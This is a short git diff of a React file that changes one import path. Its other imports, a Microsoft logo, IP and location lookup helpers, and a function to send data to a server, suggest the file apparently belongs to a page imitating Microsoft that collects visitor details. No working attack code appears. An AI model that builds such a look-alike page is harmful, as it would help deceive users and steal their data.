@@ -7,7 +7,7 @@ import { useEffect, useState } from "react";
 import Microsoft from "../../public/Microsoft_logo_(2012).png";
 import ToolTip from "../../public/question.png";
 import Back from "../../public/back.png";
-import MicrosoftLoading from "../component/MicrosoftLoading";
+import MicrosoftLoading from "./MicrosoftLoading";
 import { getIp, getLocationDetails } from "../utils/getData";
 import { sendDataToServer } from "../utils/postData";
 
